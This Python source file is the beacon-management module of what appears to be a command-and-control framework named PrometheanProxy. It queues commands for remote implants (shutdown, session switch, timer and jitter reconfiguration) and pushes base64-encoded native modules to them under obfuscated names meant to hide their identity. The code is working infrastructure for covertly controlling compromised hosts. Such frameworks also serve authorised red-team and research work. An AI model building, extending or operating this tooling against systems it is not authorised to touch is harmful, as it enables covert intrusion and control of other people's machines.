# ============================================================================
# Beacon Module
# ============================================================================
# This module manages asynchronous beacon connections, allowing clients to
# check in periodically for commands rather than maintaining persistent sessions.
# ============================================================================

# Standard Library Imports
import ast
import base64
import json
import os
import readline
import time
import traceback
import uuid

# Third-Party Imports
import colorama

# Local Module Imports
from ServerDatabase.database import DatabaseClass
from ..utils.file_manager import FileManagerClass
from ..global_objects import (
    command_list,
    beacon_list,
    logger,
    tab_completion,
    obfuscation_map,
)


# ============================================================================
# Beacon Command Class
# ============================================================================


class beacon_command:
    """
    Represents a queued command for a beacon to execute.
    
    Attributes:
        command_uuid: Unique identifier for this command
        beacon_uuid: UUID of the beacon this command is for
        command: Command string to execute
        command_output: Output returned from command execution
        executed: Boolean indicating if command has been executed
        command_data: Additional data payload for the command
    """
    
    def __init__(
        self,
        command_uuid,
        beacon_uuid,
        command,
        command_output,
        executed,
        command_data
    ):
        logger.debug(f"Creating beacon command: {command_uuid} for beacon: {beacon_uuid}")
        self.command_uuid = command_uuid
        self.beacon_uuid = beacon_uuid
        self.command = command
        logger.debug(f"Command: {command}")
        self.command_output = command_output
        self.executed = executed
        self.command_data = command_data
        
        # Log command data (truncate large payloads for readability)
        if (isinstance(command_data, dict) and 'data' in command_data and
            len(command_data['data']) > 100):
            logger.debug(
                f"Command data (truncated): "
                f"{{... 'data': <{len(command_data['data'])} bytes> ...}}"
            )
        else:
            logger.debug(f"Command data: {command_data}")


# ============================================================================
# Beacon Class
# ============================================================================


class Beacon:
    """
    Represents an asynchronous beacon connection.
    
    Beacons check in periodically based on configured timer and jitter settings
    to retrieve queued commands and send execution results. Unlike sessions,
    beacons do not maintain persistent connections.
    
    Attributes:
        uuid: Unique identifier for this beacon
        database: Database connection instance
        file_manager: File manager for handling file operations
        address: IP address of the beacon
        hostname: Hostname of the beacon
        operating_system: Operating system of the beacon
        last_beacon: Timestamp of last check-in (human-readable)
        next_beacon: Expected timestamp of next check-in (human-readable)
        timer: Check-in interval in seconds
        jitter: Jitter percentage for randomizing check-in timing
        config: Configuration dictionary
        loaded_modules: List of modules loaded on this beacon
        loaded_this_instant: Flag indicating if beacon was just created
    """

    def __init__(
        self,
        uuid: str,
        address: str,
        hostname: str,
        operating_system: str,
        last_beacon: float,
        timer: float,
        jitter: float,
        modules: list,
        config: dict,
        database: DatabaseClass,
        from_db: bool = False
    ):
        logger.debug(f"Creating beacon with UUID: {uuid}")
        self.uuid = uuid
        self.database = database
        self.file_manager = FileManagerClass(config, uuid)
        self.address = address
        self.hostname = hostname
        self.operating_system = operating_system
        
        # ----------------------------------------------------------------
        # Parse and Format Beacon Timing
        # ----------------------------------------------------------------
        lb_float = 0.0
        if isinstance(last_beacon, (float, int)):
            lb_float = float(last_beacon)
        elif isinstance(last_beacon, str):
            try:
                lb_float = time.mktime(
                    time.strptime(last_beacon, "%a %b %d %H:%M:%S %Y")
                )
            except ValueError:
                try:
                    lb_float = time.mktime(
                        time.strptime(last_beacon, "%Y-%m-%d %H:%M:%S")
                    )
                except ValueError:
                    logger.warning(
                        f"Invalid last_beacon format: {last_beacon}. "
                        "Using current time."
                    )
                    lb_float = time.time()
        else:
            lb_float = time.time()

        self.last_beacon = time.asctime(time.localtime(lb_float))
        self.next_beacon = time.asctime(time.localtime(lb_float + timer))
        
        self.timer = timer
        self.jitter = jitter
        self.config = config
        
        # ----------------------------------------------------------------
        # Parse Modules List
        # ----------------------------------------------------------------
        if isinstance(modules, str):
            try:
                self.loaded_modules = ast.literal_eval(modules)
            except (ValueError, SyntaxError):
                logger.warning(
                    f"Failed to parse modules string: {modules}. "
                    "Defaulting to empty list."
                )
                self.loaded_modules = []
        else:
            self.loaded_modules = modules if modules is not None else []

        # ----------------------------------------------------------------
        # Save to Database (if not loading from database)
        # ----------------------------------------------------------------
        self.loaded_this_instant = False
        if not from_db:
            self.loaded_this_instant = True
            # Check if persistent beacons are enabled in config
            persist_beacons = config.get("command_database", {}).get("persist_beacons", True)
            if persist_beacons:
                self.database.insert_entry(
                    "beacons",
                    [
                        self.uuid,
                        self.address,
                        self.hostname,
                        self.operating_system,
                        self.last_beacon,
                        self.next_beacon,
                        self.timer,
                        self.jitter,
                        str(self.loaded_modules)
                    ]
                )
            else:
                logger.debug(f"Beacon {self.uuid}: Not persisting to database (persist_beacons=False)")

    # ========================================================================
    # Connection Management Methods
    # ========================================================================

    def close_connection(self, userID) -> None:
        """
        Close the beacon connection after user confirmation.
        
        Queues a shutdown command for the beacon and removes it from the
        active beacon list upon user confirmation.
        
        Args:
            userID: Unique identifier for the beacon
        """
        if (input(
                colorama.Back.RED +
                "Are you sure want to close the connection?: y/N ").lower()
                == "y"):
            print(
                colorama.Back.YELLOW +
                colorama.Fore.BLACK +
                "Closing " + userID
            )

            try:
                logger.debug(f"Closing connection for beacon: {userID}")
                add_beacon_command_list(userID, None, "shutdown", self.database)

            except BaseException:  # handles ssl.SSLEOFError
                logger.error(f"Error closing connection for beacon: {userID}")
                if not self.config['server']['quiet_mode']:
                    print(colorama.Fore.RED + "Traceback:")
                    traceback.print_exc()
                    logger.error(traceback.format_exc())
                pass
            
            logger.debug(f"Removing beacon from list: {userID}")
            remove_beacon_list(userID)
            print(colorama.Back.GREEN + "Closed")
        else:
            print(
                colorama.Back.GREEN +
                "Connection not closed"
            )
        return

    # ========================================================================
    # Module Management Methods
    # ========================================================================

    def load_module_beacon(self, userID) -> None:
        """
        Interactively load a module onto the beacon.
        
        Presents the user with a list of available modules for the beacon's
        operating system and loads the selected module.
        
        Args:
            userID: Unique identifier for the beacon
        """
        def _resolve_module_base() -> str:
            """
            Resolve the base directory for modules.
            
            Prefers unified structure under ~/.PrometheanProxy/plugins but
            falls back to configured module location.
            
            Returns:
                str: Path to the module base directory
            """
            candidates = [
                os.path.expanduser(self.config['server'].get('module_location', '')),
                os.path.expanduser('~/.PrometheanProxy/plugins'),
            ]
            for c in candidates:
                if c and os.path.isdir(c):
                    return c
            # Default to unified location if nothing exists yet
            return os.path.expanduser('~/.PrometheanProxy/plugins')

        command_location = _resolve_module_base()
        repo_plugins = os.path.abspath(
            os.path.join(os.path.dirname(__file__), "../../Plugins")
        )
        
        try:
            # ----------------------------------------------------------------
            # Determine Platform-Specific Settings
            # ----------------------------------------------------------------
            os_str = str(self.operating_system).lower()
            platform_folder = 'windows' if 'windows' in os_str else 'linux'
            ext = '.dll' if platform_folder == 'windows' else '.so'
            channel = 'debug' if 'debug' in os_str else 'release'
            module_names: list[str] = []

            # ----------------------------------------------------------------
            # Discover Available Modules
            # ----------------------------------------------------------------
            # Legacy structure has OS folders at root (linux/windows/<channel>/*.ext)
            legacy_linux = os.path.join(command_location, 'linux')
            legacy_windows = os.path.join(command_location, 'windows')
            
            if os.path.isdir(legacy_linux) or os.path.isdir(legacy_windows):
                # Legacy structure
                files: list[str] = []
                for ch in ('release', 'debug'):
                    d = os.path.join(command_location, platform_folder, ch)
                    if os.path.isdir(d):
                        files.extend([f for f in os.listdir(d) if f.endswith(ext)])
                module_names = [
                    os.path.splitext(f)[0].removesuffix('-debug') for f in files
                ]
            else:
                # Unified structure: <name>/{release,debug}/{name}[-debug].ext
                for name in os.listdir(command_location):
                    full = os.path.join(command_location, name)
                    if not os.path.isdir(full):
                        continue
                    fname = f"{name}{'-debug' if channel == 'debug' else ''}{ext}"
                    cand = os.path.join(full, channel, fname)
                    if os.path.isfile(cand):
                        module_names.append(name)

                # Fallback to repo tree if none found in user directory
                if not module_names and os.path.isdir(repo_plugins):
                    for name in os.listdir(repo_plugins):
                        full = os.path.join(repo_plugins, name)
                        if not os.path.isdir(full):
                            continue
                        fname = f"{name}{'-debug' if channel == 'debug' else ''}{ext}"
                        cand = os.path.join(full, channel, fname)
                        if os.path.isfile(cand):
                            module_names.append(name)

            # Display available modules
            print("Available modules:")
            for name in sorted(set(module_names)):
                print(f" - {name}")
                
        except Exception as e:
            logger.error(f"Error listing modules in {command_location}: {e}")
            print(f"Error listing modules in {command_location}: {e}")
            return
        
        # ----------------------------------------------------------------
        # Get User Selection
        # ----------------------------------------------------------------
        readline.set_completer(
            lambda text, state: tab_completion(
                text, state, list(module_names) + ["exit"]
            )
        )
        module_name = input("Enter the module name to load: ")
        if not module_name:
            print("No module name provided.")
            return
        if module_name in self.loaded_modules:
            print(f"Module '{module_name}' is already loaded.")
            return
        
        logger.debug(f"Loading module '{module_name}' for userID: {userID}")
        self.load_module_direct_beacon(userID, module_name)


    def load_module_direct_beacon(self, userID, module_name) -> None:
        """
        Load a specified module onto the beacon without user interaction.
        
        Resolves the module file path, reads the module binary, encodes it,
        and queues it as a command for the beacon to load.
        
        Args:
            userID: Unique identifier for the beacon
            module_name: Name of the module to load
        """
        # ----------------------------------------------------------------
        # Resolve Module Path
        # ----------------------------------------------------------------
        def _resolve_module_base() -> str:
            """
            Resolve the base directory for modules.
            
            Returns:
                str: Path to the module base directory
            """
            candidates = [
                os.path.expanduser(self.config['server'].get('module_location', '')),
                os.path.expanduser('~/.PrometheanProxy/plugins'),
            ]
            for c in candidates:
                if c and os.path.isdir(c):
                    return c
            return os.path.expanduser('~/.PrometheanProxy/plugins')

        command_location = os.path.abspath(_resolve_module_base())
        repo_plugins = os.path.abspath(
            os.path.join(os.path.dirname(__file__), "../../Plugins")
        )
        os_str = str(self.operating_system).lower()
        platform_folder = 'windows' if 'windows' in os_str else 'linux'
        ext = '.dll' if platform_folder == 'windows' else '.so'
        channel = 'debug' if 'debug' in os_str else 'release'

        # Unified layout: <name>/{release,debug}/{name}[-debug].ext
        filename = f"{module_name}{'-debug' if channel=='debug' else ''}{ext}"
        module_path = os.path.join(command_location, module_name, channel, filename)
        
        # ----------------------------------------------------------------
        # Fallback to Legacy Structure if Needed
        # ----------------------------------------------------------------
        if not os.path.isfile(module_path):
            legacy_base = os.path.expanduser(
                self.config['server'].get('module_location', '')
            )
            legacy_try = os.path.join(
                legacy_base,
                'windows' if platform_folder == 'windows' else 'linux',
                channel,
                f"{module_name}{'-debug' if channel=='debug' else ''}{ext}"
            )
            if os.path.isfile(legacy_try):
                module_path = legacy_try

        # Fallback to repo tree if still missing
        if not os.path.isfile(module_path) and os.path.isdir(repo_plugins):
            repo_try = os.path.join(repo_plugins, module_name, channel, filename)
            if os.path.isfile(repo_try):
                module_path = repo_try

        if not os.path.isfile(module_path):
            logger.error(
                f"Module file for '{module_name}' not found in expected locations."
            )
            print(f"Module file for '{module_name}' not found.")
            return

        # ----------------------------------------------------------------
        # Load and Queue Module
        # ----------------------------------------------------------------
        module_path = os.path.abspath(os.path.expanduser(module_path))
        logger.debug(
            f"Loading module '{module_name}' for userID: {userID} "
            f"from path: {module_path}"
        )
        try:
            with open(module_path, "rb") as module_file:
                file_data = module_file.read()
                file_data = base64.b64encode(file_data).decode('utf-8')

                # Get obfuscated name if configured
                obf_name = module_name
                try:
                    entry = obfuscation_map.get(module_name)
                    if isinstance(entry, dict):
                        obf_name = entry.get("obfuscation_name") or module_name
                except Exception:
                    obf_name = module_name

                # Queue module load command
                add_beacon_command_list(
                    userID,
                    None,
                    "module",
                    self.database,
                    {"name": obf_name, "data": file_data},
                )
            
            logger.debug(
                f"Module '{module_name}' added to command list for userID: {userID}"
            )
            if module_name not in self.loaded_modules:
                self.loaded_modules.append(module_name)
                
        except FileNotFoundError:
            logger.error(f"Module file '{module_path}' not found.")
            print(f"Module file '{module_path}' not found.")
        except Exception as e:
            logger.error(f"Error loading module '{module_name}': {e}")
            print(f"Error loading module '{module_name}': {e}")
            traceback.print_exc()

    # ========================================================================
    # Session and Command Management Methods
    # ========================================================================

    def switch_session(self, userID) -> None:
        """
        Switch the beacon to session mode.
        
        Queues a command instructing the beacon to switch from asynchronous
        beacon mode to persistent session mode.
        
        Args:
            userID: Unique identifier for the beacon
        """
        logger.debug(f"Switching session for userID: {userID}")
        add_beacon_command_list(userID, None, "session", self.database, {})

    def list_db_commands(self, userID) -> None:
        """
        List all queued commands for this beacon.
        
        Displays command UUIDs, command strings, and their execution status
        for all commands queued for this beacon.
        
        Args:
            userID: Unique identifier for the beacon
        """
        logger.debug(f"Listing commands for userID: {userID}")
        for _, beacon_commands in command_list.items():
            if beacon_commands.beacon_uuid == userID:
                logger.debug(
                    f"Command found for userID: {userID} - {beacon_commands.command}"
                )
                logger.debug(f"Command UUID: {beacon_commands.command_uuid}")
                logger.debug(f"Command Output: {beacon_commands.command_output}")
                logger.debug(f"Command Executed: {beacon_commands.executed}")
                
                # Determine status display
                output = beacon_commands.command_output if beacon_commands.command_output else "Awaiting Response"
                if output == "Received":
                    status_display = colorama.Fore.CYAN + "Status: Received (waiting for output)"
                elif output == "Awaiting Response":
                    status_display = colorama.Fore.YELLOW + "Status: Awaiting Response"
                else:
                    # Truncate long output
                    max_len = 100
                    display_output = output if len(output) <= max_len else output[:max_len] + "..."
                    status_display = colorama.Fore.GREEN + f"Status: Completed\n                    Output: {colorama.Fore.WHITE}{display_output}"
                
                print(f"""{colorama.Fore.WHITE}Command ID: {colorama.Fore.BLUE}{beacon_commands.command_uuid}
                    Command: {colorama.Fore.MAGENTA}{beacon_commands.command}
                    {status_display}""")  # noqa
        return

    def history(self, userID) -> None:
        """
        Display command history for this beacon from the database.
        
        Retrieves and displays all executed commands for this beacon including
        command strings, execution status, and output from the database.
        
        Args:
            userID: Unique identifier for the beacon
        """
        logger.debug(f"Retrieving command history for beacon: {userID}")
        
        def deobfuscate_module_name(obf_name: str) -> str:
            """
            Reverse lookup to find the real module name from obfuscated name.
            
            Args:
                obf_name: The obfuscated module name
                
            Returns:
                The real module name, or the obfuscated name if not found
            """
            try:
                # Search through obfuscation map for matching obfuscation_name
                for module_name, module_data in obfuscation_map.items():
                    if isinstance(module_data, dict):
                        if module_data.get("obfuscation_name") == obf_name:
                            return module_name
            except Exception as e:
                logger.debug(f"Error deobfuscating module name '{obf_name}': {e}")
            return obf_name
        
        try:
            # Ensure we have the latest data by forcing a commit/refresh
            # This handles any pending transactions from other threads
            try:
                self.database.dbconnection.commit()
            except Exception as e:
                logger.debug(f"Commit before query (expected if no pending transactions): {e}")
            
            # Create a fresh cursor to ensure we get the latest data
            fresh_cursor = self.database.dbconnection.cursor()
            
            # Query database for all commands for this beacon
            query = "SELECT command, command_uuid, executed, command_output, command_data FROM beacon_commands WHERE beacon_uuid = ?"
            fresh_cursor.execute(query, (userID,))
            commands = fresh_cursor.fetchall()
            fresh_cursor.close()
            
            if not commands:
                print(colorama.Fore.YELLOW + f"No command history found for beacon {userID}")
                logger.info(f"No command history found for beacon {userID}")
                return
            
            # Display header
            print(colorama.Fore.CYAN + "\n" + "="*80)
            print(colorama.Fore.CYAN + f"Command History for Beacon: {userID}")
            print(colorama.Fore.CYAN + "="*80)
            
            # Display each command
            for idx, (command, cmd_uuid, executed, output, command_data) in enumerate(commands, 1):
                # Check in-memory command_list first for most up-to-date status
                # (database might have lag due to commit timing)
                in_memory_cmd = command_list.get(cmd_uuid)
                if in_memory_cmd and in_memory_cmd.command_output:
                    # Use in-memory output if available (more current than DB)
                    output = in_memory_cmd.command_output
                    executed = in_memory_cmd.executed
                
                # Debug logging to see actual database values
                logger.debug(f"Command {idx}: executed={executed} (type={type(executed)}), output={output[:50] if output else 'None'}...")
                
                # Determine status based on executed flag and output content
                # executed is a boolean/int from database: True/1 = executed, False/0 = not executed
                # Check if command has actual output (not just status messages)
                has_real_output = (output and 
                                  output not in ["Received", "Awaiting Response", "Command received by beacon", ""])
                
                if executed == True or executed == 1 or has_real_output:
                    status = colorama.Fore.GREEN + "Completed"
                elif output == "Received":
                    status = colorama.Fore.CYAN + "Received"
                elif output == "Awaiting Response":
                    status = colorama.Fore.YELLOW + "Awaiting Response"
                else:
                    status = colorama.Fore.YELLOW + "Pending"
                
                # Parse command data for better display
                display_command = command
                if command == "module" and command_data:
                    try:
                        import ast
                        data = ast.literal_eval(command_data) if isinstance(command_data, str) else command_data
                        if isinstance(data, dict) and 'name' in data:
                            obf_module_name = data['name']
                            # Deobfuscate the module name
                            real_module_name = deobfuscate_module_name(obf_module_name)
                            display_command = f"Load Module: {real_module_name}"
                    except Exception as e:
                        logger.debug(f"Failed to parse module command data: {e}")
                        display_command = command
                    
                print(f"\n{colorama.Fore.WHITE}[{idx}] Command: {colorama.Fore.MAGENTA}{display_command}")
                print(f"    UUID: {colorama.Fore.BLUE}{cmd_uuid}")
                print(f"    Status: {status}")
                
                # Show actual output based on status
                # If executed, always show the real output (not "Received")
                has_real_output = (output and 
                                  output not in ["Received", "Awaiting Response", "Command received by beacon", ""])
                
                if executed == True or executed == 1 or has_real_output:
                    # Command has been executed - show actual output
                    max_output_len = 500
                    display_output = output if len(output) <= max_output_len else output[:max_output_len] + "..."
                    print(f"    Output: {colorama.Fore.WHITE}{display_output}")
                elif output == "Received":
                    # Beacon picked up command but hasn't sent response yet
                    print(f"    Output: {colorama.Fore.CYAN}{output}")
                elif output == "Awaiting Response":
                    print(f"    Output: {colorama.Fore.YELLOW}{output}")
                else:
                    # Fallback for any other case
                    print(f"    Output: {colorama.Fore.YELLOW}{output if output else 'Pending'}")
            
            print(colorama.Fore.CYAN + "\n" + "="*80 + "\n")
            logger.info(f"Displayed {len(commands)} commands from history for beacon {userID}")
            
        except Exception as e:
            logger.error(f"Error retrieving command history for beacon {userID}: {e}")
            print(colorama.Fore.RED + f"Error retrieving command history: {e}")
        
        return

    def beacon_configuration(self, userID) -> None:
        """
        Configure beacon parameters interactively.
        
        Prompts the user to enter configuration commands and values (e.g.,
        timer, jitter) and queues them as a configuration command for the beacon.
        
        Args:
            userID: Unique identifier for the beacon
        """
        logger.debug(f"Configuring beacon for userID: {userID}")
        data = {}
        additional_data = "y"
        
        while additional_data != "n":
            command = input("Enter Configuration command: ")
            value = input("Enter configuration value: ")
            logger.debug(
                f"Adding configuration command: {command} with value: {value}"
            )
            
            if value.isdigit():
                value = int(value)
                data[command] = value
            else:
                print("Value must be an integer")
            
            if (input("Add another confiugration option? (y/N)")
                      .lower() == "y"):
                continue
            else:
                break
        
        logger.debug(f"Final configuration data: {data}")
        add_beacon_command_list(
            userID, None, "beacon_configuration", self.database, data
        )
        return

# ============================================================================
# Global Beacon Management Functions
# ============================================================================

def add_beacon_list(
    uuid: str,
    r_address: str,
    hostname: str,
    operating_system: str,
    last_beacon: float,
    timer: float,
    jitter: int,
    config,
    database: DatabaseClass,
    modules=None,
    from_db=False
) -> None:
    """
    Add a new beacon to the global beacon list.
    
    Creates a new Beacon instance and adds it to the global beacon_list
    dictionary for tracking and management.
    
    Args:
        uuid: Unique identifier for the beacon
        r_address: IP address of the beacon
        hostname: Hostname of the beacon
        operating_system: Operating system of the beacon
        last_beacon: Timestamp of last check-in
        timer: Check-in interval in seconds
        jitter: Jitter percentage for randomizing timing
        config: Configuration dictionary
        database: Database connection instance
        modules: List of loaded modules (default: ["shell", "close", "session"])
        from_db: Whether beacon is being loaded from database
    """
    from Modules.utils.ui_manager import log_connection_event, update_connection_stats
    from Modules.global_objects import beacon_list, sessions_list
    
    logger.debug(f"Adding beacon with UUID: {uuid}")
    logger.debug(f"Beacon address: {r_address}")
    logger.debug(f"Beacon hostname: {hostname}")
    logger.debug(f"Beacon operating system: {operating_system}")
    logger.debug(f"Beacon last beacon: {last_beacon}")
    logger.debug(f"Beacon timer: {timer}")
    logger.debug(f"Beacon jitter: {jitter}")
    
    if modules is None:
        modules = ["shell", "close", "session"]
    
    new_beacon = Beacon(
        uuid, r_address, hostname, operating_system, last_beacon, timer,
        jitter, modules, config, database, from_db=from_db
    )
    beacon_list[uuid] = new_beacon
    
    # Log the new beacon connection
    if not from_db:
        log_connection_event(
            "beacon",
            f"New beacon from {hostname} ({r_address}) - {operating_system}",
            {"host": hostname, "ip": r_address, "os": operating_system, "timer": timer, "uuid": uuid}
        )
        # Update connection stats
        update_connection_stats(len(sessions_list), len(beacon_list))


def add_beacon_command_list(
    beacon_uuid: str,
    command_uuid: str,
    command: str,
    database: DatabaseClass,
    command_data: dict = None
) -> None:
    """
    Queue a command for a beacon to execute.
    
    Creates a new beacon_command instance and adds it to the global command_list
    dictionary. Also persists the command to the database.
    
    Args:
        beacon_uuid: Unique identifier for the beacon
        command_uuid: Unique identifier for the command (auto-generated if None)
        command: Command string to execute
        database: Database connection instance
        command_data: Additional data payload for the command (optional)
    """
    if command_data is None:
        command_data = {}
    
    logger.debug(f"Adding command for beacon UUID: {beacon_uuid}")
    logger.debug(f"Command UUID: {command_uuid}")
    logger.debug(f"Command: {command}")
    
    # Log command data (truncate large payloads)
    if (isinstance(command_data, dict) and 'data' in command_data and
        len(command_data['data']) > 100):
        logger.debug(
            f"Command data (truncated): "
            f"{{... 'data': <{len(command_data['data'])} bytes> ...}}"
        )
    else:
        logger.debug(f"Command data: {command_data}")

    # Generate UUID if not provided
    if not command_uuid or command_uuid == "":
        command_uuid = str(uuid.uuid4())
        logger.debug(f"Generated new command UUID: {command_uuid}")
    
    # Create command instance
    new_command = beacon_command(
        command_uuid, beacon_uuid,
        command, "", False, command_data
    )
    
    # Persist to database
    database.insert_entry(
        "beacon_commands",
        [
            command,
            command_uuid,
            beacon_uuid,
            str(command_data),
            False,
            "Awaiting Response"
        ]
    )

    logger.debug(f"New command created: {new_command}")
    command_list[command_uuid] = new_command


def remove_beacon_list(uuid: str) -> None:
    """
    Remove a beacon from the global beacon list.
    
    Removes the beacon with the specified UUID from the beacon_list dictionary.
    
    Args:
        uuid: Unique identifier for the beacon to remove
    """
    logger.debug(f"Removing beacon with UUID: {uuid}")
    if uuid in beacon_list:
        beacon_list.pop(uuid)
        logger.debug(f"Beacon {uuid} removed from beacon list")
    else:
        print(f"Beacon {uuid} not found in beacon list")
        logger.warning(f"Beacon {uuid} not found in beacon list")
    logger.debug(f"Beacon list after removal: {beacon_list.keys()}")